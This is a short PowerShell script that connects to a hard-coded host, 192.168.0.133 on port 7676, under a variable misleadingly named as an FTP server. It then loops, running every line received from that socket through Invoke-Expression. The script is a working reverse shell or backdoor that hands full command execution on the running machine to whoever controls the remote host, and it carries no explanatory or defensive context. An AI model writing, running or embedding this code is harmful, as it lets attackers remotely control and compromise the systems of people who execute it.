$FTPServer = "192.168.0.133"
$FTPPort = "7676"

$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true

while ($tcpConnection.Connected) {
    while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {
        Invoke-Expression $reader.ReadLine()
    }

    # if ($tcpConnection.Connected) {
    #     Write-Host -NoNewline "prompt> "
    #     $command = Read-Host

    #     if ($command -eq "escape") {
    #         break
    #     }

    #     $writer.WriteLine($command) | Out-Null
    #     Start-Sleep -Milliseconds 10
    # }
    start-sleep -Milliseconds 500
}

$reader.Close()
$writer.Close()
$tcpConnection.Close()